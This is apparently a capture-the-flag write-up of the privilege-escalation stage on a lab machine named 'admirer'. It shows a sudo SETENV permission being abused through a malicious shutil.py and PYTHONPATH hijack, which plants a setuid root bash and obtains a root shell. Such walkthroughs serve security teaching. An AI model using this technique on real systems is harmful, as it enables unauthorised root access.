# 15 - PrivEsc


# admin_tasks.sh
```bash
waldo@admirer:/opt/scripts$ sudo -l 
[sudo] password for waldo: 
Matching Defaults entries for waldo on admirer:
    env_reset, env_file=/etc/sudoenv, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, listpw=always

User waldo may run the following commands on admirer:
    (ALL) SETENV: /opt/scripts/admin_tasks.sh
```

The unique thing about this permission on admin_tasks is that we can set the environment with sudo. By default sudo inherits the environment of the *user* (mostly root) instead of the invoking user. With this privilege the invoking user can set the environment as they wish.


```bash
waldo@admirer:/opt/scripts$ ls -l
total 8
-rwxr-xr-x 1 root admins 2613 Dec  2  2019 admin_tasks.sh
-rwxr----- 1 root admins  198 Dec  2  2019 backup.py
```


# admin_tasks.sh
```bash
waldo@admirer:/opt/scripts$ cat admin_tasks.sh  
backup_web()
        echo "Running backup script in the background, it might take a while..."
        /opt/scripts/backup.py &

```

admin_tasks.sh runs backup.py

# backup.py
```bash
waldo@admirer:/opt/scripts$ cat backup.py 
#!/usr/bin/python3

from shutil import make_archive

src = '/var/www/html/'

# old ftp directory, not used anymore
#dst = '/srv/ftp/html'

dst = '/var/backups/html'

make_archive(dst, 'gztar', src)
```

backup.py imports shutil library in order to execute make_archive. Privilege escalation from here is fairly simple. With the SETENV privilege we can preload shutil library with an environment variable pointing to our own shutil.py


# shutil.py (malicious)
```py
waldo@admirer:/dev/shm$ cat shutil.py
import os
def make_archive(x,y,z):
        os.system("cp /bin/bash /home/waldo/bash")
        os.system("chown root:root /home/waldo/bash")
        os.system("chmod u+s /home/waldo/bash")
```
This copies /bin/bash to /home/waldo/bash. I am in /dev/shm because I didn't know that /dev/shm is mounted as nosuid.



# root
```
waldo@admirer:/dev/shm$ echo 6| sudo PYTHONPATH=$(pwd) /opt/scripts/admin_tasks.sh 2>/dev/null
waldo@admirer:/dev/shm$ ~/bash -p
bash-4.4# id
uid=1000(waldo) gid=1000(waldo) euid=0(root) groups=1000(waldo),1001(admins)
bash-4.4# 
```
